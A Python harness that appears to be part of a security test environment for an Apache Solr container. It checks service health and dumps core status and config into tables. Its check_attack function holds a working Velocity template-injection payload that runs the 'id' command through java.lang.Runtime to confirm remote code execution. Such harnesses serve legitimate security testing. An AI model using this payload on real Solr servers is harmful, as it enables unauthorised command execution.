import os
from typing import Any, Dict
from basic.server_state import ServerState
from basic.table import Table
import requests
import pandas as pd

def hc_single(scene) -> bool:
    success = False
    try:
        http_port = scene.target_container['ports'][0]

        response = requests.get(f"http://localhost:{http_port}/solr/admin/cores?indexInfo=false&wt=json")
                    
        if "/opt/solr/server/solr/demo" in response.text:
            success = True
    except (StopIteration, requests.RequestException):
        return False
    return success


def get_state(container_name: str, http_port: int, db_port: int = -1, save_tag: str = "demo") -> ServerState:
    
    def convert_numpy_to_python(value):
        import numpy as np
        if isinstance(value, np.bool_):
            return bool(value)
        elif isinstance(value, np.integer):
            return int(value)
        elif isinstance(value, np.floating):
            return float(value)
        elif isinstance(value, np.ndarray):
            return value.tolist()
        else:
            return value

    def flatten_json(data, prefix='', sep='.'):

        items = {}
        
        if isinstance(data, dict):
            for key, value in data.items():
                new_key = f"{prefix}{sep}{key}" if prefix else key
                if isinstance(value, (dict, list)):
                    items.update(flatten_json(value, new_key, sep))
                else:
                    items[new_key] = value
        elif isinstance(data, list):
            for i, value in enumerate(data):
                new_key = f"{prefix}[{i}]"
                if isinstance(value, (dict, list)):
                    items.update(flatten_json(value, new_key, sep))
                else:
                    items[new_key] = value
        else:
            items[prefix] = data
            
        return items
    cores = requests.get(
        f"http://localhost:{http_port}/api/cores"
    ).json()
    core_status: Dict[str, Any] = cores['status']
    status_rows = []
    all_columns = set()
    

    for core_name, status in core_status.items():
        status_with_core_name = {"core_name": core_name, **status}
        flattened_data = flatten_json(status_with_core_name)
        all_columns.update(flattened_data.keys())

    status_columns = sorted(list(all_columns))


    for core_name, status in core_status.items():
        status_with_core_name = {"core_name": core_name, **status}
        flattened_data = flatten_json(status_with_core_name)
        
        row = []
        for col in status_columns:
            if col in flattened_data:
                value = flattened_data[col]
                # 将numpy类型转换回原生Python类型
                converted_value = convert_numpy_to_python(value)
                row.append(converted_value if converted_value is not None else "")
            else:
                row.append("")
        status_rows.append(row)

    config_columns = []
    config_rows = []
    all_config_columns = set()
    

    for row in status_rows:
        core_name = row[status_columns.index('core_name')]
        try:
            core_config = requests.get(
                f"http://localhost:{http_port}/api/cores/{core_name}/config"
            ).json()['config']
            config_with_core_name = {"core_name": core_name, **core_config}
            flattened_config = flatten_json(config_with_core_name)
            all_config_columns.update(flattened_config.keys())
        except Exception as e:
            continue
    
    config_columns = sorted(list(all_config_columns))
    
    for row in status_rows:
        core_name = row[status_columns.index('core_name')]
        try:
            core_config = requests.get(
                f"http://localhost:{http_port}/api/cores/{core_name}/config"
            ).json()['config']
            config_with_core_name = {"core_name": core_name, **core_config}
            flattened_config = flatten_json(config_with_core_name)
            
            config_row = []
            for col in config_columns:
                if col in flattened_config:
                    value = flattened_config[col]
                    converted_value = convert_numpy_to_python(value)
                    config_row.append(converted_value if converted_value is not None else "")
                else:
                    config_row.append("")
            config_rows.append(config_row)
        except Exception as e:
            config_row = []
            for col in config_columns:
                if col == 'core_name':
                    config_row.append(core_name)
                else:
                    config_row.append("")
            config_rows.append(config_row)
    status_table = Table(
        "status",
        False,
        status_columns,
        status_rows
    )
    config_table = Table(
        "config",
        False,
        config_columns,
        config_rows
    )
    return ServerState(
        db_state=[status_table, config_table],
        file_state=[]
    )

def check_attack(http_port: int, container_id: str, session: requests.Session, db_port: int) -> bool:
    try:
        response = requests.get(f"http://localhost:{http_port}/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
        if response.status_code == 200 and "uid=" in response.text and "gid=" in response.text and "groups=" in response.text:
            return True
        else:
            return False
    except:
        return False
